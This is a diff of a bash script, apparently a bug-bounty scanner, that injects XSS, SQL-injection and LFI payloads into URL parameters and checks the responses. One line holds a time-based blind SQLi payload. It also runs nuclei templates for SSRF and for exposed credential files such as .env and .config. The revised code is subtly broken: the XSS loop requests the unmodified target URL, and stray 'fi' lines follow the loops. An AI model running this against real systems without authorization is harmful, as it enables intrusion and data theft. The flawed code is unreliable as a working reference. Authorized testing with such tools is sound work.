@@ -87,19 +87,23 @@ rm subdomains.txt 200subs.txt 200crawl.txt archive_links
 
 echo "[+] Testing for xss"
 
-while IFS= read -r payload ; do
+while IFS= read -r xss_line ; do
 
-        while IFS= read -r domain ; do
+    xss_payload=$(echo "$xss_line" | awk -F "§" '{print $1}')
 
-                url_check=$(echo "$domain" | grep "=")
+    xss=$(echo "$xss_line" | awk -F "§" '{print $2}')
 
-                        if [ -n "$url_check" ] ; then
+        while IFS= read -r xss_target ; do
 
-                        url=$(echo "$url_check" | qsreplace "$payload")
+                xss_url_check=$(echo "$xss_target" | grep "=")
 
-                        echo "Testing $url"
+                        if [ -n "$xss_url_check" ] ; then
 
-                        resp=$(curl -s "$url")
+                        xss_url=$(echo "$xss_url_check" | qsreplace "$xss_payload")
+
+                        echo "Testing $xss_target"
+
+                        xss_resp=$(curl -s "$xss_target")
 
                                 if [[ $? -ne 0 ]] ; then
 
@@ -107,11 +111,11 @@ while IFS= read -r payload ; do
 
                                 fi
 
-                                check_result=$(echo "$resp" | grep -q "$payload")
+                                xss_check_result=$(echo "$xss_resp" | grep -q "$xss")
 
                                         if [[ $? -eq 0 ]] ; then
 
-                                        echo -e "Possible XSS found: $url" | notify
+                                        echo -e "Possible XSS found: $xss_url" | notify
 
                                         fi
 
@@ -123,33 +127,43 @@ done < xsspayloads.txt
 
 echo "[+] Testing for SQLi"
 
-cat final_links | grep "=" | qsreplace '0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z' | httpx -mrt '>10' -o sqli_findings.txt
+echo "Testing for SQLi" | notify
 
-if [ -s "sqli_findings.txt" ] ; then
+while IFS= read -r sqli_payload ; do
 
-    echo 'Possible SQL injections:' | notify
+    cat "$filename".txt | qsreplace "$sqli_payload" >> testforsqli.txt
 
-    cat sqli_findings.txt | notify
+    done < sqlipayloads.txt
+
+    httpx -l testforsqli.txt -mrt '>4' -o sqli_finds.txt
+
+    rm testforsqli.txt
+
+        if [ -e "sqli_finds.txt" ]; then
+
+        echo 'Possible SQL injections found:' | notify
+
+        cat "sqli_finds.txt" | notify
+
+        fi
 
 fi
 
-rm sqli_findings.txt
-
 echo "[+] Testing for LFI"
 
-while IFS= read -r lfi ; do
+while IFS= read -r lfi_payload ; do
 
-    while IFS= read -r domain ; do
+    while IFS= read -r lfi_target ; do
 
-        url_check=$( echo "$domain" | grep "=" )
+        lfi_url_check=$( echo "$lfi_target" | grep "=" )
 
-        if [ -n "$url_check" ] ; then
+        if [ -n "$lfi_url_check" ] ; then
 
-                url=$(echo "$url_check" | qsreplace "$lfi")
+                lfi_url=$(echo "$lfi_url_check" | qsreplace "$lfi_payload")
 
-        echo "Testing $url"
+        echo "Testing $lfi_url"
 
-        resp=$(curl -s "$url")
+        lfi_resp=$(curl -s "$lfi_url")
 
         if [[ $? -ne 0 ]] ; then
 
@@ -157,11 +171,11 @@ while IFS= read -r lfi ; do
 
         fi
 
-        check_result=$(echo "$resp" | grep -q "root:x")
+        lfi_check_result=$(echo "$lfi_resp" | grep -q "root:x")
 
         if [[ $? -eq 0 ]] ; then
 
-            echo -e "Possible LFI found: $url" | notify
+            echo -e "Possible LFI found: $lfi_url" | notify
 
         fi
 
@@ -171,31 +185,35 @@ while IFS= read -r lfi ; do
 
 done < LFIpayloads.txt
 
-echo "[+] Testing for SSRF"
+echo "Testing for SSRF" | notify
 
-interactsh-client > serverinfo.txt &
+nuclei -l final_links -t /root/fuzzing-templates/ssrf -o ssrf_finds.txt
 
-server_name=$(cat serverinfo.txt | head -n 12 | tail -n 1 | sed 's/^\[[^]]*\] //')
+    if [ -e "ssrf_finds.txt" ]; then
 
-server_address="http:$server_name"
+        echo 'Possible SSRFs found:' | notify
 
-cat final_links | grep "=" | qsreplace "$server_address" | httpx
+        cat "ssrf_finds.txt" | notify
 
-results_check=$(cat serverinfo.txt | wc -l)
-
-if [ "$results_check" -gt 12 ] ; then
-
-    echo 'SSRF Server Logs' | notify
-
-    cat serverinfo.txt | notify
-
-    rm serverinfo.txt
-
-else
-
-    rm serverinfo.txt
+    fi
 
 fi
+
+echo "Testing for credential exposures" | notify
+
+cat final_links | grep '.js|.php|.json|.asp|.aspx|.config|.env|.cgi' >> sensitive_files
+
+nuclei -l sensitive_files -t /root/nuclei-templates/http/exposures -o sensitive_finds.txt
+
+rm sensitive_files
+
+if [ -e "sensitive_finds.txt" ]; then
+
+        echo 'Possible sensitive data found:' | notify
+
+        cat "sensitive_finds.txt" | notify
+
+    fi
 
 rm final_links
 
